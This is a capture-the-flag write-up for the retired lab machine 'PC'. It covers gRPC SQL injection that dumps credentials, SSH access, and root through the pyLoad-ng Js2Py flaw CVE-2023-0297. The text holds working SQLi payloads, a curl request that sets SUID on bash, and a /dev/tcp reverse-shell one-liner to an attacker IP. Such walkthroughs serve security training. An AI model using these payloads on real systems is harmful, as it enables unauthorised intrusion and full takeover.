# PC

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square) ![Released](https://img.shields.io/badge/Released-2023--05--20-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Easy |
| **Release** | May 20, 2023 |
| **Rating** | 4.4 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

PC is an Easy Linux machine featuring a gRPC service with SQL injection and a pyLoad-ng privilege escalation. Port 50051 hosts a gRPC SimpleApp service vulnerable to SQL injection in the getInfo endpoint. Extracting credentials from the database provides SSH access as user sau. Root escalation is achieved by exploiting CVE-2023-0297 (Js2Py sandbox escape) in pyLoad-ng v0.5.0b3 running as root on localhost:8000.

---

## Recon

### Port Scan
```bash
nmap -sC -sV -T4 <TARGET_IP> -oN nmap-quick.txt
```
Key findings:
- Port 22: SSH OpenSSH 8.2p1
- Port 50051: gRPC service (HTTP/2 based)

### Service Enumeration

**gRPC Service Discovery**
```bash
# Install grpcurl for gRPC interaction
# List available services
grpcurl -plaintext <TARGET_IP>:50051 list

# Output shows SimpleApp service
# List methods
grpcurl -plaintext <TARGET_IP>:50051 list SimpleApp

# Methods discovered:
# - SimpleApp.LoginUser
# - SimpleApp.RegisterUser
# - SimpleApp.getInfo
```

---

## Foothold

### Vulnerability
- **Type**: SQL Injection (UNION-based)
- **Service**: gRPC SimpleApp custom application
- **Discovery Method**: Manual parameter testing in getInfo method

### Exploitation

**Step 1: Register and Login**
```bash
# Register a user
grpcurl -plaintext -d '{"username":"test","password":"test123"}' \
  <TARGET_IP>:50051 SimpleApp.RegisterUser

# Login to get token
grpcurl -plaintext -d '{"username":"test","password":"test123"}' \
  <TARGET_IP>:50051 SimpleApp.LoginUser

# Response includes JWT token
```

**Step 2: SQL Injection in getInfo**
```bash
# Test for SQLi - getInfo(id) parameter is vulnerable
# Union injection with 1 column
grpcurl -plaintext -d '{"id":"1 UNION SELECT 1"}' \
  -H "token: [JWT_TOKEN]" \
  <TARGET_IP>:50051 SimpleApp.getInfo

# Dump accounts table
grpcurl -plaintext -d '{"id":"1 UNION SELECT group_concat(username,0x3a,password) FROM accounts"}' \
  -H "token: [JWT_TOKEN]" \
  <TARGET_IP>:50051 SimpleApp.getInfo
```

**Step 3: Extract Credentials**
```
Credentials found: sau:HereIsYourPassWord1431
```

**Step 4: SSH Access**
```bash
ssh sau@<TARGET_IP>
# Password: HereIsYourPassWord1431
```

### Shell Obtained
- **User**: sau
- **Access Method**: SSH with credentials from SQL injection

---

## User Flag

### Path to User
SQL injection → credentials extraction → SSH access as sau

### Flag
```
[flag redacted]
```

---

## Privilege Escalation

### Enumeration
```bash
# Check for internal services
ss -tlnp | grep 127
```
Output shows:
```
127.0.0.1:8000 - Internal web service
```

**Service Identification**
```bash
# Port forward to investigate
ssh -L 8000:127.0.0.1:8000 sau@<TARGET_IP>

# Access http://localhost:8000 in browser
# Reveals pyLoad-ng v0.5.0b3 running as root
```

### Vulnerability
- **Type**: Sandbox Escape / RCE (CVE-2023-0297)
- **Service**: pyLoad-ng v0.5.0b3
- **Discovery Method**: Version fingerprinting + CVE search

pyLoad-ng v0.5.0b3 uses Js2Py to evaluate JavaScript, which has a sandbox escape vulnerability allowing arbitrary Python code execution.

### Exploitation
```bash
# CVE-2023-0297: Js2Py eval RCE
# The /flash/addcrypted2 endpoint is vulnerable

curl -X POST http://127.0.0.1:8000/flash/addcrypted2 \
  --data 'jk=pyimport%20os;os.system("chmod%20u%2Bs%20/bin/bash");'

# This sets SUID bit on /bash
/bin/bash -p
# Spawns root shell
```

Alternative one-liner reverse shell:
```bash
curl -X POST http://127.0.0.1:8000/flash/addcrypted2 \
  --data 'jk=pyimport%20os;os.system("bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.X/9001%200%3E%261%27");'
```

---

## Root Flag

### Path to Root
Internal pyLoad-ng service → CVE-2023-0297 (Js2Py eval) → SUID bash → Root shell

### Flag
```
[flag redacted]
```

---

## Attack Chain Summary
```
Port 50051 (gRPC SimpleApp) → SQL Injection in getInfo(id) → Credentials (sau:HereIsYourPassWord1431) → SSH Access → Internal pyLoad-ng v0.5.0b3 on localhost:8000 → CVE-2023-0297 (Js2Py Sandbox Escape) → Root
```

## Tools Used
- nmap: Port scanning
- grpcurl: gRPC service interaction and exploitation
- ssh: Remote access and port forwarding
- curl: pyLoad-ng exploit delivery

## Dead Ends
None encountered - linear progression from SQLi to root.

## Key Techniques
- **gRPC Enumeration**: Using grpcurl for service discovery and method listing
- **gRPC SQL Injection**: UNION-based injection in gRPC method parameters
- **SSH Port Forwarding**: Accessing internal services via SSH tunnel
- **Js2Py Sandbox Escape**: Exploiting JavaScript-to-Python bridge for RCE
- **Two-Stage Exploitation**: Initial SQLi for credentials, then localhost service for root

## Lessons Learned
- What worked well: grpcurl with reflection made gRPC enumeration straightforward
- What wasted time: Nothing - clean exploitation path
- Key takeaway for future machines: Always check for internal services with `ss -tlnp` after initial access; gRPC services can be tested like REST APIs with proper tools

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
